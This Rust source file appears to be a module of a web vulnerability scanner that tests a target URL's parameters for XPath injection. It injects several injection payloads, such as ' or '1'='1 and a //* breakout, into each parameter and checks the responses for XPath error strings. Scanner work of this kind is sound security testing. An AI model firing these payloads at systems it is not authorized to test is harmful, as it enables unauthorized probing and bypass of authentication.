use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;

/// XPath Injection detection
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: XPath Injection", "[*]".yellow());

    let params = Analyzer::extract_params(target);
    if params.is_empty() { return Ok(()); }

    let client = HttpClient::new()?;

    let xpath_errors = vec![
        "XPathException", "xmlXPathEval", "xpath syntax error",
        "DOMXPath", "invalid expression", "SimpleXMLElement",
        "xmlXPathCompOpEval", "not a valid XPath",
    ];

    for (param_name, original_val) in &params {
        let payloads = vec![
            format!("{}' or '1'='1", original_val),
            format!("{}' or ''='", original_val),
            format!("{}')] | //*[('1'='1", original_val),
            format!("{}' and count(/)>0 and '1'='1", original_val),
            "' or 1=1 or '1'='1".to_string(),
            "1' or '1'='1".to_string(),
        ];

        for payload in &payloads {
            let url = Analyzer::inject_param(target, param_name, &payload)?;
            if let Ok(result) = Analyzer::send_and_analyze(&client, &url, "").await {
                let body_lower = result.response_body.to_lowercase();
                for err in &xpath_errors {
                    if body_lower.contains(&err.to_lowercase()) {
                        println!(
                            "{} CONFIRMED: XPath Injection in param '{}'",
                            "[!]".red().bold(), param_name
                        );
                        println!("    Error: {}", err);
                        return Ok(());
                    }
                }
            }
        }
    }

    Ok(())
}
